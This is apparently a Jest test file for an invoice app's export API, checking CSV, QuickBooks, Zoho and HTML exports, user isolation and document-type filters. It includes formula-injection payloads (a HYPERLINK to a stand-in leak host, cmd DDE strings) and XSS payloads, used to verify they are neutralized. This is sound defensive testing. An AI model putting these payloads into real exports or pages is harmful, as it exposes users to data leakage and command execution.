jest.mock("../../services/invoiceService");

const invoiceService = require("../../services/invoiceService");
const { request, app, registerAndLogin, authed } = require("../helpers/api");
const { mockSuccessfulExtract } = require("../mocks/invoiceService.mock");
const { samplePngBuffer } = require("../helpers/fixtures");

async function createClient(token) {
  const res = await request(app)
    .post("/api/customers")
    .set(authed(token))
    .send({ company_name: "Export Client" });
  return res.body.customer.id;
}

async function uploadOne(token, clientId, overrides = {}, documentType) {
  mockSuccessfulExtract(invoiceService, { invoice: overrides });
  const req = request(app)
    .post("/api/upload")
    .set(authed(token))
    .field("client_id", String(clientId));

  if (documentType) {
    req.field("document_type", documentType);
  }

  const res = await req.attach("image", samplePngBuffer(), "invoice.png");
  return res.body.invoice;
}

describe("Export", () => {
  it("requires authentication", async () => {
    const res = await request(app).get("/api/export?format=csv");
    expect(res.status).toBe(401);
  });

  it("exports CSV with the expected headers and numeric precision", async () => {
    const { token } = await registerAndLogin();
    const clientId = await createClient(token);
    await uploadOne(token, clientId, { totalAmount: 123.456, subtotal: 117.577 });

    const res = await request(app)
      .get("/api/export?format=csv")
      .set(authed(token));

    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toMatch(/text\/csv/);

    const [headerLine, dataLine] = res.text.split("\n");
    expect(headerLine).toBe(
      "Invoice No,Client,Invoice Date,Due Date,Subtotal,VAT Rate,VAT Amount,Total Amount,Currency,TRN,Phone,Location,Description,Item Description,Qty,Unit Price,Item Total"
    );
    expect(dataLine).toContain("Acme Supplies LLC");
  });

  it("neutralizes CSV/formula-injection payloads instead of writing them as live formulas (BUG-EXPORT-002)", async () => {
    const { token } = await registerAndLogin();
    const clientId = await createClient(token);
    await uploadOne(token, clientId, {
      clientName: '=HYPERLINK("http://evil.example/leak","Click me")',
      description: '+cmd|"/c calc"!A1',
    });

    const res = await request(app)
      .get("/api/export?format=csv")
      .set(authed(token));

    expect(res.status).toBe(200);
    // A leading quote neutralizes the formula trigger — Excel/Sheets treat
    // the cell as text. The raw =/+ must never be the first character of
    // a field in the output.
    expect(res.text).toContain("'=HYPERLINK");
    expect(res.text).toContain("'+cmd|");
    expect(res.text).not.toMatch(/,=HYPERLINK/);
    expect(res.text).not.toMatch(/,\+cmd\|/);
  });

  it("also neutralizes formula-injection payloads on the QuickBooks CSV export", async () => {
    const { token } = await registerAndLogin();
    const clientId = await createClient(token);
    await uploadOne(token, clientId, {
      clientName: "@SUM(1+1)*cmd|' /C calc'!A0",
    });

    const res = await request(app)
      .get("/api/export?format=quickbooks")
      .set(authed(token));

    expect(res.status).toBe(200);
    expect(res.text).toContain("'@SUM");
    expect(res.text).not.toMatch(/,@SUM/);
  });

  it("exports QuickBooks CSV with the expected headers", async () => {
    const { token } = await registerAndLogin();
    const clientId = await createClient(token);
    await uploadOne(token, clientId);

    const res = await request(app)
      .get("/api/export?format=quickbooks")
      .set(authed(token));

    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toMatch(/text\/csv/);
    expect(res.text.split("\n")[0]).toBe(
      "InvoiceNo,Customer,InvoiceDate,DueDate,Terms,Location,Memo,Item(Product/Service),ItemDescription,ItemQuantity,ItemRate,ItemAmount,Taxable,TaxRate,TaxAmount,Service Date,Currency"
    );
  });

  it("exports a Zoho Books Bills xlsx file", async () => {
    const { token } = await registerAndLogin();
    const clientId = await createClient(token);
    await uploadOne(token, clientId);

    const res = await request(app)
      .get("/api/export?format=zoho")
      .set(authed(token));

    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toMatch(/spreadsheet/);
  });

  it("handles an empty invoice set without crashing", async () => {
    const { token } = await registerAndLogin();

    const res = await request(app)
      .get("/api/export?format=csv")
      .set(authed(token));

    expect(res.status).toBe(200);
    expect(res.text.split("\n")).toHaveLength(1); // header row only
  });

  it("only exports the requesting user's own invoices", async () => {
    const userA = await registerAndLogin();
    const userB = await registerAndLogin();
    const clientA = await createClient(userA.token);
    await uploadOne(userA.token, clientA, { invoiceNo: "A-ONLY-INV" });

    const res = await request(app)
      .get("/api/export?format=csv")
      .set(authed(userB.token));

    expect(res.text).not.toContain("A-ONLY-INV");
  });
});

describe("Export filtered by document_type", () => {
  it("only exports invoices matching the requested document type", async () => {
    const { token } = await registerAndLogin();
    const clientId = await createClient(token);
    await uploadOne(token, clientId, { invoiceNo: "SUP-1" }, "supplier_invoice");
    await uploadOne(token, clientId, { invoiceNo: "BILL-1" }, "bill");

    const supplierRes = await request(app)
      .get("/api/export?format=csv&document_type=supplier_invoice")
      .set(authed(token));

    expect(supplierRes.status).toBe(200);
    expect(supplierRes.text).toContain("SUP-1");
    expect(supplierRes.text).not.toContain("BILL-1");

    const billRes = await request(app)
      .get("/api/export?format=csv&document_type=bill")
      .set(authed(token));

    expect(billRes.status).toBe(200);
    expect(billRes.text).toContain("BILL-1");
    expect(billRes.text).not.toContain("SUP-1");
  });

  it("combines client and document_type filters (ABC + Bill only)", async () => {
    const { token } = await registerAndLogin();
    const clientAbc = await createClient(token);
    const clientOther = await request(app)
      .post("/api/customers")
      .set(authed(token))
      .send({ company_name: "Other Client" });
    const otherClientId = clientOther.body.customer.id;

    await uploadOne(token, clientAbc, { invoiceNo: "ABC-BILL" }, "bill");
    await uploadOne(token, clientAbc, { invoiceNo: "ABC-SUPPLIER" }, "supplier_invoice");
    await uploadOne(token, otherClientId, { invoiceNo: "OTHER-BILL" }, "bill");

    const res = await request(app)
      .get(`/api/export?format=csv&client_id=${clientAbc}&document_type=bill`)
      .set(authed(token));

    expect(res.status).toBe(200);
    expect(res.text).toContain("ABC-BILL");
    expect(res.text).not.toContain("ABC-SUPPLIER");
    expect(res.text).not.toContain("OTHER-BILL");
  });

  it("rejects an invalid document_type on export", async () => {
    const { token } = await registerAndLogin();

    const res = await request(app)
      .get("/api/export?format=csv&document_type=nonsense")
      .set(authed(token));

    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
  });

  it("rejects an invalid document_type on download-excel", async () => {
    const { token } = await registerAndLogin();

    const res = await request(app)
      .get("/api/download-excel?document_type=nonsense")
      .set(authed(token));

    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
  });

  it("rejects an invalid document_type on the HTML report", async () => {
    const { token } = await registerAndLogin();

    const res = await request(app)
      .get("/api/report?document_type=nonsense")
      .set(authed(token));

    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
  });
});

describe("HTML report/export XSS protection (BUG-EXPORT-001)", () => {
  const scriptPayload = "<script>alert(1)</script>";
  const imgPayload = "<img src=x onerror=alert(2)>";
  const escapedScriptPayload = "&lt;script&gt;alert(1)&lt;/script&gt;";
  const escapedImgPayload = "&lt;img src=x onerror=alert(2)&gt;";

  async function uploadWithXssPayload(token, clientId) {
    mockSuccessfulExtract(invoiceService, {
      invoice: { clientName: scriptPayload, description: imgPayload },
    });

    await request(app)
      .post("/api/upload")
      .set(authed(token))
      .field("client_id", String(clientId))
      .attach("image", samplePngBuffer(), "invoice.png");
  }

  it("HTML-escapes client name/description in GET /api/report instead of injecting raw markup", async () => {
    const { token } = await registerAndLogin();
    const clientId = await createClient(token);
    await uploadWithXssPayload(token, clientId);

    const res = await request(app).get("/api/report").set(authed(token));

    expect(res.status).toBe(200);
    expect(res.text).not.toContain(scriptPayload);
    expect(res.text).not.toContain(imgPayload);
    expect(res.text).toContain(escapedScriptPayload);
    expect(res.text).toContain(escapedImgPayload);
  });

  it("HTML-escapes client name/description in GET /api/export?format=html the same way", async () => {
    const { token } = await registerAndLogin();
    const clientId = await createClient(token);
    await uploadWithXssPayload(token, clientId);

    const res = await request(app)
      .get("/api/export?format=html")
      .set(authed(token));

    expect(res.status).toBe(200);
    expect(res.text).not.toContain(scriptPayload);
    expect(res.text).not.toContain(imgPayload);
    expect(res.text).toContain(escapedScriptPayload);
    expect(res.text).toContain(escapedImgPayload);
  });
});
